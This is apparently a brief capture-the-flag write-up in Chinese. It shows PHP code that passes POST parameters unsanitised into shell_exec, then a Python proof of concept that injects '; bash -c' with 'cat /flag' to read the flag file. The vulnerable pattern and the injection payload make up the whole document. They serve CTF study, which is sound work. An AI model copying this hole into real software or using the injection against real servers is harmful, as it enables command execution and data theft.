- # 题目
	- ```php
	      $action = $_POST["action"];
	      $data = "'".$_POST["data"]."'";
	  
	      $output = shell_exec("不用管 -jar jar/NCHU.jar $action $data"); 
	  ```
- # PoC
	- ```python
	  r = base_post(url, data = {
	      "action": "; bash -c ",
	      "data": "cat /flag"
	  })
	  
	  print(r.text)
	  ```